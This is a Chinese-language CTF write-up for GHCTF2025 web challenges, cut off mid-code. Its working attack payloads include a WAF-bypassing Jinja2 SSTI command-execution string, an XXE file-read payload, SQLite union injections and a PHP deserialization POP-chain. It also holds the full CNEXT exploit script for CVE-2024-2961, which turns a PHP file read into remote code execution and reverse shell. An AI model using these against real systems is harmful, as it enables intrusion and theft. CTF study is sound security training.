---
title: GHCTF2025
date: 2025-03-06 20:08:39
tags:
categories: 比赛复现
---

###  GHCTF2025

### web

#### [GHCTF 2025]upload?SSTI!

页面是一个上传文件的页面

**![image-20250309155845046](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503091558137.png)**

我们下载附件，查看关键代码

```py
ALLOWED_EXTENSIONS = {'txt', 'log', 'text','md','jpg','png','gif'}.

def contains_dangerous_keywords(file_path):
    dangerous_keywords = ['_', 'os', 'subclasses', '__builtins__', '__globals__','flag',]

    with open(file_path, 'rb') as f:
        file_content = str(f.read())


        for keyword in dangerous_keywords:
            if keyword in file_content:
                return True  # 找到危险关键字，返回 True

    return False  # 文件内容中没有危险关键字
    
    @app.route('/file/<path:filename>')
def view_file(filename):
    try:
        # 1. 过滤文件名
        safe_filename = secure_filename(filename)
        if not safe_filename:
            abort(400, description="无效文件名")

        # 2. 构造完整路径
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)

        # 3. 路径安全检查
        if not is_safe_path(app.config['UPLOAD_FOLDER'], file_path):
            abort(403, description="禁止访问的路径")

        # 4. 检查文件是否存在
        if not os.path.isfile(file_path):
            abort(404, description="文件不存在")

        suffix=os.path.splitext(filename)[1]
        print(suffix)
        if suffix==".jpg" or suffix==".png" or suffix==".gif":
            return send_from_directory("static/uploads/",filename,mimetype='image/jpeg')

        if contains_dangerous_keywords(file_path):
            # 删除不安全的文件
            os.remove(file_path)
            return jsonify({"error": "Waf!!!!"}), 400

        with open(file_path, 'rb') as f:
            file_data = f.read().decode('utf-8')
        tmp_str = """<!DOCTYPE html>
        <html lang="zh">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>查看文件内容</title>
        </head>
        <body>
            <h1>文件内容：{name}</h1>  <!-- 显示文件名 -->
            <pre>{data}</pre>  <!-- 显示文件内容 -->

            <footer>
                <p>&copy; 2025 文件查看器</p>
            </footer>
        </body>
        </html>
        """.format(name=safe_filename, data=file_data)

        return render_template_string(tmp_str)
```

通过代码我们可以发现，允许上传的后缀有'txt', 'log', 'text','md','jpg','png','gif'，并且过滤了ssti的几个关键字

并且将上传的文件内容在/file/filename页面上进行了渲染，我们猜测这题考的是ssti

我们上传

```
{{7*7}}
```

查看/file/1.txt

![image-20250309160258354](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503091602379.png)

返回49，考的是jinjia2模版注入

我们创个有ssti模版注入的页面，然后让fenjing去爆破它

```py
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    user_input = request.args.get('name', 'Guest')
    dangerous_keywords = ['_', 'os', 'subclasses', '__builtins__', '__globals__', 'flag', ]
    for i in dangerous_keywords:
        if i in user_input:
            return "haacker!!!"
    template = f"Hello {user_input}!"
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```

运行py，得到网页链接，然后扔给fenjing去爆破

![image-20250309162920213](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503091629264.png)

执行cat /flag，找到运行的ssti注入语句

```py
{%set fq='so'[::-1]%}{%set dg=lipsum|escape|batch(22)|first|last%}{%set gl=dg*2+'globals'+dg*2%}{%set bu=dg*2+'builtins'+dg*2%}{%set ip=dg*2+'import'+dg*2%}{{cycler.next[gl][bu][ip](fq).popen('cat /f''lag').read()}}
```

最后回到原题，将这个payload上传上去，访问文件，得到flag

![image-20250309163143271](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503091631300.png)



#### (>﹏<)

美化一下代码

```py
from flask import Flask, request
import base64
from lxml import etree
import re

app = Flask(__name__)

@app.route('/')
def index():
    """返回当前文件的内容"""
    return open(__file__).read()

@app.route('/ghctf', methods=['POST'])
def parse():
    """解析提交的XML并返回'name'元素的值"""
    xml = request.form.get('xml')
    
    if xml is None:
        return "No System is Safe."
    
    # 创建XML解析器，启用DTD和实体解析
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    
    try:
        # 解析XML字符串
        root = etree.fromstring(xml, parser)
        name = root.find('name').text
        return name or None
    except etree.XMLSyntaxError as e:
        return f"XML Parsing Error: {e}"

if __name__ == "__main__":
    # 运行Flask应用
    app.run(host='0.0.0.0', port=8080)

```

观察代码，我们猜测这是xml漏洞

我们用postman传一个xml上去

```
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<root>
  <name>&xxe;</name>
</root>
```

![image-20250309164630094](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503091646151.png)

得到flag



#### SQL???

![image-20250311144022600](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111440888.png)



很明显存在一个sql注入点，但这里考的不是mysql注入，而是sqlite注入

sqllite注入和mysql注入差不多，了解一下语法就能简单解出来了

依旧是先**查字段数**

```
1 order by 5
1 order by 6
```

第一个不报错，第二个报错，说明字段数在5个

然后**爆显示位**

```
1 union select 1,2,3,4,5
```

![image-20250311144718564](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111447668.png)



可以看到2,3,4,5都有回显

然后**查版本**，这里就开始和mysql注入有区别了

```
?id=1 union select 1,2,3,4,sqlite_version()
```

![image-20250311145121692](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111451772.png)

然后**爆表名**

```
?id=1 union select 1,2,3,4,sql from sqlite_master
```

![image-20250311144909903](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111449992.png)

，

得到了表flag 和字段flag

然后**爆flag**

```
?id=1 union select 1,2,3,4,group_concat(flag) from flag
```



#### ez_readfile

```php
<?php
  show_source(__FILE__);
  if (md5($_POST['a']) === md5($_POST['b'])) {
      if ($_POST['a'] != $_POST['b']) {
          if (is_string($_POST['a']) && is_string($_POST['b'])) {
              echo file_get_contents($_GET['file']);
          }
      }
  }
?>
```

##### **强碰撞绕过**

我们去网上找个[文章](https://blog.csdn.net/m0_73818134/article/details/131793815)的链子去绕过

![image-20250311151141915](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111511997.png)



或者使用fastcoll进行碰撞

![image-20250311151544555](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111515644.png)

![image-20250311151557252](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111515330.png)



##### 文件读取利用

接下来有两种解法，一个是直接进行目录遍历，一个是直接使用CVE-2024-2961漏洞实现命令执行

   第一种解法，有出过题的，大部分都是采用https://github.com/CTF-Archives/ctf-docker-template这里面的模版。一般出题过程中，为了方便，不去修改dockerfile文件，都会直接在容器内修改，然后再commit生成镜像。

里面的php出题模版中，有一个容器启动命令文件docker-entrypoint.sh。可以看到该命令文件在容器初始化后就会被删掉。但是在提交生成镜像后，由镜像生成容器又需要运行该文件。因此有的出题者为了方便可能就不删除该文件，这时候就可以碰碰运气，看看出题者有没有把这个文件删掉。没有删掉，就能够获取路径。                                   

因此，我们在这里直接读取/docker-entrypoint.sh文件，那个得到flag的路径

![image-20250311152920000](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111529047.png)

```
/f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag
```

访问得到flag

![image-20250311152958144](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111529184.png)



##### CVE-2024-2961

这里有两个脚本，一个是官方的脚本

**官方脚本**

在这里只需要修改send函数（请求包的参数设置），download函数（内容的正则匹配），将check_vulnerable函数中的部分failure函数的调用换成pass（使用时，会吞字符，但不影响漏洞利用。），即可正常运行脚本。

web目录没有写权限，该漏洞不回显，因此只能通过反弹shell或外带的方式进行利用。

~~~py
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#
# REQUIREMENTS
#
# Requires ten: https://github.com/cfreal/ten
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError
from urllib.parse import unquote
from base64 import b64decode
from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.

    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.

    The code here serves as an example that attacks a page that looks like:

    ```php
    <?php

    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```

    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        return self.session.post(
            self.url,
            params={"file": path},
            data={
                "a": b64decode("cHN5Y2hvCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFetWq88ihNWtZYYbaXqMoFf+9kkIi+P1ESiN3ZYuAjXbSzg1ExS1/tvEHQZAoJ9eyubdAX/bK6NRfQfhDyuAQ+bEtSBpUr5SA95RSrcK7G0D95jQ0DaMjmLwwB/i19oxtOLZDivhXwUdwbCOkO8DBv9u5jOFs63tjrzmbU5+f/C"),
                "b": b64decode("cHN5Y2hvCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFetWq88ihNWtZYYbaXqMoFf+9mkIi+P1ESiN3ZYuAjXbSzg1ExS1/tvEHQZAgJ+eyubdAX/bK6NRfQfBDyuAQ+bEtSBpUr5SA95RSrcK7G0D95jw0DaMjmLwwB/i19oxtOLZDivhXwUdwbCOkM8DBv9u5jOFs63tjrzmTU5+f/C")
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )

    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        data = response.re.search(b"<\/code>([\s\S]*)", flags=re.S).group(1)
        print(response.text)
        return base64.decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep_time", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """

        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")


        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        result = safe_download(path)

        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            pass

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            pass

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path == ""
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",

            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.latin1.latin1",

            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.latin1.latin1",

            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.latin1.latin1",

            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",

            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.latin1.latin1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass

        msg_print()

        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")

        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
~~~

![image-20250311171353424](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111713563.png)

反弹成功，成功获取flag

![image-20250311171318464](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111713738.png)



##### [kezibei](https://github.com/kezibei)脚本

https://github.com/kezibei/php-filter-iconv

该脚本只要当前目录中有目标靶机的/proc/self/maps和libc.so文件，即可将payload跑出来，让我们自己去运行。

payload会随着当前maps的变化而变化，因此payload并不是固定的，这里就不公布我的payload了

![image-20250311171421090](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503111714259.png)

#### Popppppp

```php
<?php
error_reporting(0);

class CherryBlossom {
    public $fruit1;
    public $fruit2;

    public function __construct($a) {
        $this->fruit1 = $a;
    }

    function __destruct() {
        echo $this->fruit1;
    }

    public function __toString() {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}

class Forbidden {
    private $fruit3;

    public function __construct($string) {
        $this->fruit3 = $string;
    }

    public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
}

class Warlord {
    public $fruit4;
    public $fruit5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->fruit4;
        return $function();
    }

    public function __get($arg1) {
        $this->fruit5->ll2('b2');
    }
}

class Samurai {
    public $fruit6;
    public $fruit7;

    public function __toString() {
        $long = @$this->fruit6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->fruit7->tt2) {
            echo "xxx are the best!!!";
        }
    }
}

class Mystery {

    public function __get($arg1) {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) {
                echo ($day4 . '<br>');
            }
        });
    }
}

class Princess {
    protected $fruit9;

    protected function addMe() {
        return "The time spent with xxx is my happiest time" . $this->fruit9;
    }

    public function __call($func, $args) {
        call_user_func([$this, $func . "Me"], $args);
    }
}

class Philosopher {
    public $fruit10;
    public $fruit11="sr22kaDugamdwTPhG5zU";

    public function __invoke() {
        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey;
        }
    }
}

class UselessTwo {
    public $hiddenVar = "123123";

    public function __construct($value) {
        $this->hiddenVar = $value;
    }

    public function __toString() {
        return $this->hiddenVar;
    }
}

class Warrior {
    public $fruit12;
    private $fruit13;

    public function __set($name, $value) {
        $this->$name = $value;
        if ($this->fruit13 == "xxx") {
            strtolower($this->fruit12);
        }
    }
}

class UselessThree {
    public $dummyVar;

    public function __call($name, $args) {
        return $name;
    }
}

class UselessFour {
    public $lalala;

    public function __destruct() {
        echo "Hehe";
    }
}

if (isset($_GET['GHCTF'])) {
    unserialize($_GET['GHCTF']);
} else {
    highlight_file(__FILE__);
}
```

##### 代码审计

这是一道反序列化的题，这种题一般是先找到要利用的点，然后反过来推怎么触发这个点

我们发现Mystery类存在可以利用原生类的函数

```php
class Mystery {

    public function __get($arg1) {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) {
                echo ($day4 . '<br>');
            }
        });
    }
}
```

此时我们可以考虑利用php原生类进行构造恶意代码攻击。那么我们就先将其暂定为链尾

然后我们发现该函数在魔术方法`__get()`中;，那我们要如何去触发它

我们发现在Philosopher这个类中存在访问不存在的键值key这个操作，会触发`__get()`函数

```php
class Philosopher {
    public $fruit10;
    public $fruit11="sr22kaDugamdwTPhG5zU";

    public function __invoke() {
        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey;
        }
    }
}
```

接下来我们就需要去触发`__invoke()`这个函数

我们发现在Warlord类中出现了将对象调用为函数的操作

接下来我们需要触发Warlord中的`__call()`函数

我们在Samurai类中的`__tostring`函数中找到了

```php
class Samurai {
    public $fruit6;
    public $fruit7;

    public function __toString() {
        $long = @$this->fruit6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->fruit7->tt2) {
            echo "xxx are the best!!!";
        }
    }
}
```

接下来我们就是需要去触发`__tostring`函数

我们在CherryBlossom类中的`__destruct()`找到将fruit对象当做字符串调用

```php
class CherryBlossom {
    public $fruit1;
    public $fruit2;

    public function __construct($a) {
        $this->fruit1 = $a;
    }

    function __destruct() {
        echo $this->fruit1;
    }

    public function __toString() {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}
```

至此，我们的pop链就找全了

```
CherryBlossom{__destruct()} -->  Samurai{__toString()} --> Warlord{__call()} --> Philosopher{__invoke()} --> Mystery{__get()}
```

但我们发现Philosopher类中需要绕过一个双重md5才能触发`__invoke()`

##### 双重md5

```py
# -*- coding: utf-8 -*-
# 运行: python2 md5.py "666" 0
import multiprocessing
import hashlib
import random
import string
import sys

CHARS = string.ascii_letters + string.digits


def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds)
        value = md5.hexdigest()
        if value[start: start + str_len] == substr:
            # print rnds
            # stop_event.set()

            # 碰撞双md5
            md5 = hashlib.md5(value)
            if md5.hexdigest()[start: start + str_len] == substr:
                print rnds + "=>" + value + "=>" + md5.hexdigest() + "\n"
                stop_event.set()



if __name__ == '__main__':
    substr = sys.argv[1].strip()
    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0
    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,stop_event, str_len, start_pos)) for i in range(cpus)]
    for p in processes:
        p.start()
    for p in processes:
        p.join()
```

##### 反序列化之遍历文件目录类

```php
<?php

error_reporting(0);

class CherryBlossom
{
    public $fruit1;
    public $fruit2;



    function __destruct()
    {
        echo $this->fruit1;
    }

    public function __toString()
    {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}




class Mystery
{

    public $GlobIterator="/*";

    public function __get($arg1)
    {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) {
                echo($day4 . '<br>');
            }
        });
    }
}



class Philosopher
{
    public $fruit10;
    public $fruit11="rSYwGEnSLmJWWqkEARJp";

    public function __invoke()
    {
